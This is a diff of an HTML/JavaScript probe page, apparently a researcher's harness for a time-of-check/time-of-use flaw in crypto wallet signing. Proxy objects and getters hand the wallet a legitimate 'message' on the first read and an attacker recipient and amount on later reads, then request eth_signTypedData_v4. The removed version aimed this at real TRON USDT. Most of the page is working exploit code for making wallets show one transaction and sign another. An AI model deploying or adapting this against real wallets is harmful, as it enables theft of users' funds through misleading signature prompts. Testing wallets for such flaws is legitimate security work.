@@ -2,98 +2,344 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>proxy stack — usdt tron</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>toctou — chain probe (tokdie.github.io)</title>
 <style>
-  body { margin:0; padding:12px; font:12px/1.4 ui-monospace,monospace;
-         background:#0e1116; color:#c9d1d9; }
-  button { background:#21262d; color:#c9d1d9; border:1px solid #f85149;
-           border-radius:4px; padding:6px 14px; font:inherit; cursor:pointer; }
-  pre { background:#0a0d12; border:1px solid #2b3138; border-radius:4px;
-        padding:8px; margin:8px 0; white-space:pre-wrap; word-break:break-all;
-        max-height:70vh; overflow:auto; }
-  h2 { font-size:12px; color:#7d8590; text-transform:uppercase; margin:0 0 8px; }
+  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
+          --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590;
+          --accent:#58a6ff; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
+         background:var(--bg); color:var(--txt); }
+  h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
+       text-transform:uppercase; letter-spacing:.08em; }
+  h3 { font-size:11px; margin:10px 0 4px; color:var(--accent);
+       text-transform:uppercase; letter-spacing:.06em; }
+  .wrap { display:grid; grid-template-columns:1fr; gap:10px; padding:10px;
+          max-width:1280px; margin:0 auto; }
+  .panel { background:var(--panel); border:1px solid var(--line);
+           border-radius:6px; padding:10px; }
+  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
+           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer;
+           margin:2px; }
+  button:hover { border-color:var(--dim); }
+  button.danger { border-color:var(--bad); color:var(--bad); }
+  button.warn { border-color:var(--warn); color:var(--warn); }
+  button:disabled { opacity:.4; cursor:not-allowed; }
+  pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
+        padding:6px; margin:3px 0; max-height:340px; overflow:auto;
+        white-space:pre-wrap; word-break:break-all; font-size:11px; }
+  .row { display:flex; gap:4px; align-items:center; margin:4px 0; flex-wrap:wrap; }
+  .kv { display:grid; grid-template-columns:160px 1fr; gap:1px 8px; }
+  .kv b { color:var(--dim); font-weight:400; }
+  .badge { padding:1px 6px; border-radius:3px; font-size:10px; }
+  .badge.on  { background:#1a2f1a; color:var(--ok); }
+  .badge.off { background:#3a1a1a; color:var(--bad); }
+  .badge.warn{ background:#2f2a1a; color:var(--warn); }
+  input { background:#0a0d12; color:var(--txt); border:1px solid var(--line);
+          border-radius:4px; padding:4px 8px; font:inherit; width:100px; }
+  .out-pair { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+  @media (max-width:760px) { .out-pair { grid-template-columns:1fr; } }
+  .trace-line { padding:1px 0; }
+  .trace-line.fn { color:var(--accent); }
+  .trace-line.read { color:var(--warn); }
+  .trace-line.err { color:var(--bad); }
 </style>
 </head>
 <body>
 
-<h2>usdt tron · proxy read stack</h2>
-<button id="go">fire</button>
-<pre id="out">ready</pre>
+<div class="wrap">
+
+  <div class="panel">
+    <h2>environment</h2>
+    <div class="kv" id="env"></div>
+  </div>
+
+  <div class="panel">
+    <h2>two paths — same proxy, different chain source</h2>
+    <p style="color:var(--dim);margin:0 0 8px">
+      Оба шлют <code>eth_signTypedData_v4</code> с Proxy, который логирует стек каждого чтения
+      <code>message</code>. Разница — откуда берётся <code>domain.chainId</code>.
+      <b>Автоподстановка</b>: читает <code>eth_chainId</code> из моста. <b>Ручной</b>: вводите сами.
+    </p>
+
+    <h3>path A — auto chainId from bridge</h3>
+    <div class="row">
+      <button class="warn" id="btn_auto" onclick="path_auto()" disabled>
+        auto: eth_chainId → proxy
+      </button>
+      <span id="auto_chain">—</span>
+    </div>
+
+    <h3>path B — manual chainId</h3>
+    <div class="row">
+      <input id="manual_chain" type="text" value="1" placeholder="chainId">
+      <button class="warn" id="btn_manual" onclick="path_manual()" disabled>
+        manual: proxy with typed chainId
+      </button>
+    </div>
+
+    <h3>baseline (без proxy, для сравнения)</h3>
+    <div class="row">
+      <button id="btn_plain" onclick="path_plain()" disabled>
+        plain object · active chain
+      </button>
+      <button id="btn_plain_getter" onclick="path_plain_getter()" disabled>
+        plain object · getter inside
+      </button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h2>per-read trace</h2>
+    <p style="color:var(--dim);margin:0 0 6px">
+      Каждое чтение <code>message</code> через Proxy → строка ниже. <code>stack</code> показывает,
+      какая функция натива читает. <code>n</code> — номер чтения.
+    </p>
+    <pre id="trace_out">—</pre>
+  </div>
+
+  <div class="panel">
+    <h2>current run summary</h2>
+    <div class="out-pair">
+      <div><h3>shown / returned</h3><pre id="shown_out">—</pre></div>
+      <div><h3>error / sig</h3><pre id="signed_out">—</pre></div>
+    </div>
+    <div><h3>summary</h3><pre id="summary_out">—</pre></div>
+  </div>
+
+  <div class="panel">
+    <h2>full event log</h2>
+    <div class="row">
+      <button onclick="clearLog()">clear</button>
+      <button onclick="dumpLog()">copy to clipboard</button>
+    </div>
+    <pre id="log_out">—</pre>
+  </div>
+
+</div>
 
 <script>
-const OUT = document.getElementById('out');
-const log = (s) => { OUT.textContent += s + '\n'; OUT.scrollTop = OUT.scrollHeight; };
+/* ─────────────  config  ───────────── */
+const ORIGIN = location.origin;
+const IS_REAL = !!window.ethereum;
+let activeChain = null;   // filled by eth_chainId
 
-// USDT TRON
-const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const ATTACKER = 'TAttackerXXXXXXXXXXXXXXXXXXXXXXX';
+/* ─────────────  shared log  ───────────── */
 
-// payload: TRON transfer через TIP-712-подобную структуру
-const base = {
-  domain: {
-    name: 'USDT',
-    version: '1',
-    chainId: 728126428,              // TRON mainnet
-    verifyingContract: USDT,
-  },
-  types: {
-    Transfer: [
-      { name: 'to',     type: 'address' },
-      { name: 'amount', type: 'uint256' },
-    ],
-  },
-  primaryType: 'Transfer',
-  message: { to: USDT, amount: '1000000' },  // 1 USDT (6 decimals)
+const logEl = () => document.getElementById('log_out');
+const traceEl = () => document.getElementById('trace_out');
+
+const log = (kind, msg, data) => {
+  const el = logEl();
+  const line = `[${new Date().toISOString().slice(11,23)}] ${kind.padEnd(8)} ${msg}`;
+  const body = data !== undefined
+    ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ')
+    : '';
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
+  el.scrollTop = el.scrollHeight;
 };
 
-let reads = 0;
-const readLog = [];
+const trace = (cls, msg) => {
+  const el = traceEl();
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + msg + '\n';
+  el.scrollTop = el.scrollHeight;
+};
 
-const proxy = new Proxy(base, {
-  get(t, k, r) {
-    if (k === 'message') {
-      reads++;
-      const stack = (new Error().stack || '').split('\n').slice(2, 6).join('\n');
-      readLog.push({ n: reads, stack });
-      log(`[read ${reads}] message · stack:\n${stack}\n`);
-      if (reads >= 2) {
-        log(`[read ${reads}] → returning ATTACKER payload`);
-        return { to: ATTACKER, amount: '999999999' };
-      }
+const clearLog = () => { logEl().textContent = '—'; traceEl().textContent = '—'; };
+const dumpLog = () => {
+  const txt = logEl().textContent;
+  navigator.clipboard && navigator.clipboard.writeText(txt);
+  log('DUMP', 'log copied', { len: txt.length });
+};
+
+const out = (id, v) => {
+  document.getElementById(id).textContent =
+    typeof v === 'string' ? v : JSON.stringify(v, null, 2);
+};
+
+const shortStack = (stack, n = 4) => {
+  if (!stack) return '(no stack)';
+  return stack.split('\n').slice(1, n + 1).map(s => s.trim()).join('\n');
+};
+
+/* ─────────────  env  ───────────── */
+
+async function refreshEnv() {
+  const el = document.getElementById('env');
+  el.innerHTML = `
+    <b>location.origin</b><span>${ORIGIN}</span>
+    <b>window.ethereum</b><span class="badge ${IS_REAL ? 'on' : 'off'}">${IS_REAL ? 'present' : 'absent'}</span>
+    <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust ? 'yes' : 'no'}</span>
+    <b>active chainId</b><span id="env_chain">—</span>
+    <b>selected address</b><span id="env_addr">—</span>
+  `;
+  if (!IS_REAL) return;
+  document.getElementById('btn_auto').disabled = false;
+  document.getElementById('btn_manual').disabled = false;
+  document.getElementById('btn_plain').disabled = false;
+  document.getElementById('btn_plain_getter').disabled = false;
+
+  try {
+    activeChain = await window.ethereum.request({ method: 'eth_chainId' });
+    const n = parseInt(activeChain, 16);
+    document.getElementById('env_chain').textContent = `${activeChain} (${n})`;
+    document.getElementById('auto_chain').textContent = `${activeChain} (${n})`;
+    document.getElementById('manual_chain').value = String(n);
+    log('ENV', 'eth_chainId', { raw: activeChain, dec: n });
+  } catch (e) {
+    log('ENV', 'eth_chainId failed', { message: e.message, code: e.code });
+  }
+  try {
+    const acc = await window.ethereum.request({ method: 'eth_accounts' });
+    if (acc && acc[0]) {
+      document.getElementById('env_addr').textContent = acc[0];
+      log('ENV', 'eth_accounts', { address: acc[0] });
     }
-    return Reflect.get(t, k, r);
-  },
+  } catch (e) { /* ignore */ }
+}
+
+/* ─────────────  payload builders  ───────────── */
+
+const typedBase = (chainId) => ({
+  domain: { name: 'Tokdie', version: '1', chainId,
+            verifyingContract: '0x0000000000000000000000000000000000000000' },
+  types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
+  primaryType: 'Order',
+  message: { to: '0xLEGIT000000000000000000000000000000', amount: '100' },
 });
 
-document.getElementById('go').onclick = async () => {
-  OUT.textContent = '';
-  reads = 0; readLog.length = 0;
-  log('env: ' + location.origin);
-  log('ethereum: ' + (!!window.ethereum));
-  if (!window.ethereum) { log('no bridge'); return; }
+const LEGIT = '0xLEGIT000000000000000000000000000000';
+const ATTACK = '0xATTACKER0000000000000000000000000000';
 
-  let from;
-  try {
-    const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    from = acc[0];
-    log('from: ' + from);
-  } catch (e) { log('accounts error: ' + e.message); return; }
+/* make a proxy whose `message` getter logs stack on every read.
+   returns { proxy, stats } — stats.reads counts message reads. */
+function makeTracingProxy(base, tag) {
+  const stats = { reads: 0, log: [] };
+  const handler = {
+    get(t, k, r) {
+      if (k === 'message') {
+        stats.reads++;
+        const n = stats.reads;
+        const stack = shortStack(new Error().stack, 5);
+        // первый read → LEGIT, дальше → ATTACK (для теста окна)
+        const payload = n === 1
+          ? { to: LEGIT, amount: '100' }
+          : { to: ATTACK, amount: '999999' };
+        const entry = { n, at: new Date().toISOString().slice(11,23),
+                        returned: payload, stack };
+        stats.log.push(entry);
+        trace('read', `[${tag}] read#${n} → ${payload.to}/${payload.amount}\n${stack}`);
+        log('TRACE', `${tag} · message read#${n}`, entry);
+        return payload;
+      }
+      return Reflect.get(t, k, r);
+    },
+    ownKeys(t) {
+      log('TRACE', `${tag} · ownKeys`, { keys: Reflect.ownKeys(t) });
+      return Reflect.ownKeys(t);
+    },
+    getOwnPropertyDescriptor(t, k) {
+      return Reflect.getOwnPropertyDescriptor(t, k);
+    },
+  };
+  return { proxy: new Proxy(base, handler), stats };
+}
 
-  log('\n--- sending proxy payload ---');
+/* ─────────────  run helper  ───────────── */
+
+async function sendReal(label, payload, stats) {
+  const from = document.getElementById('env_addr').textContent;
+  if (!from || from === '—') {
+    out('signed_out', 'no address — открыто не в кошельке');
+    return;
+  }
+  log('REAL', `${label} · sending`, {
+    from, hasStats: !!stats, readsBefore: stats ? stats.reads : null,
+  });
   try {
     const sig = await window.ethereum.request({
       method: 'eth_signTypedData_v4',
-      params: [from, proxy],
+      params: [from, payload],
     });
-    log('\nsig: ' + sig);
+    log('REAL', `${label} · sig`, { sig });
+    out('signed_out', sig);
+    out('summary_out', `sig: ${sig}\nreads: ${stats ? stats.reads : 'n/a'}`);
   } catch (e) {
-    log('\nerror: ' + e.code + ' ' + e.message);
+    const info = { code: e.code, message: e.message, raw: String(e) };
+    log('REAL', `${label} · error`, info);
+    out('signed_out', JSON.stringify(info, null, 2));
+    out('summary_out', `error: ${e.code} ${e.message}\nreads: ${stats ? stats.reads : 'n/a'}`);
   }
+}
 
-  log('\n--- read summary ---');
-  log('total reads: ' + reads);
-  readLog.forEach(r => log(`read ${r.n}: ${r.stack.split('\n')[1] || '?'}`));
-};
+/* ─────────────  paths  ───────────── */
+
+async function path_auto() {
+  clearLog();
+  if (!activeChain) await refreshEnv();
+  const dec = parseInt(activeChain, 16);
+  out('shown_out', `auto chainId from bridge: ${activeChain} (${dec})`);
+  log('PATH', 'A · auto chainId', { raw: activeChain, dec });
+  const base = typedBase(dec);
+  const { proxy, stats } = makeTracingProxy(base, 'auto');
+  await sendReal('auto', proxy, stats);
+}
+
+async function path_manual() {
+  clearLog();
+  const raw = document.getElementById('manual_chain').value.trim();
+  const dec = parseInt(raw, 10);
+  if (!Number.isFinite(dec)) {
+    out('shown_out', 'manual: invalid chainId');
+    return;
+  }
+  out('shown_out', `manual chainId: ${dec}`);
+  log('PATH', 'B · manual chainId', { dec });
+  const base = typedBase(dec);
+  const { proxy, stats } = makeTracingProxy(base, 'manual');
+  await sendReal('manual', proxy, stats);
+}
+
+async function path_plain() {
+  clearLog();
+  if (!activeChain) await refreshEnv();
+  const dec = parseInt(activeChain, 16);
+  log('PATH', 'baseline · plain object', { chainId: dec });
+  await sendReal('plain', typedBase(dec), null);
+}
+
+async function path_plain_getter() {
+  clearLog();
+  if (!activeChain) await refreshEnv();
+  const dec = parseInt(activeChain, 16);
+  const base = typedBase(dec);
+  let reads = 0;
+  base.message = {
+    get to() { reads++; trace('read', `plain-getter to read#${reads}`); return reads === 1 ? LEGIT : ATTACK; },
+    get amount() { return reads <= 2 ? '100' : '999999'; },
+  };
+  log('PATH', 'baseline · getter object', { chainId: dec });
+  await sendReal('plain-getter', base, { reads: 0, log: [] });
+}
+
+/* ─────────────  boot  ───────────── */
+
+(async () => {
+  log('BOOT', 'chain probe up', { origin: ORIGIN, real: IS_REAL });
+  await refreshEnv();
+  if (IS_REAL && window.ethereum.on) {
+    window.ethereum.on('chainChanged', (id) => {
+      log('EVENT', 'chainChanged', { id });
+      activeChain = id;
+      refreshEnv();
+    });
+    window.ethereum.on('accountsChanged', (acc) => {
+      log('EVENT', 'accountsChanged', { acc });
+      refreshEnv();
+    });
+  }
+})();
 </script>
 </body>
 </html>
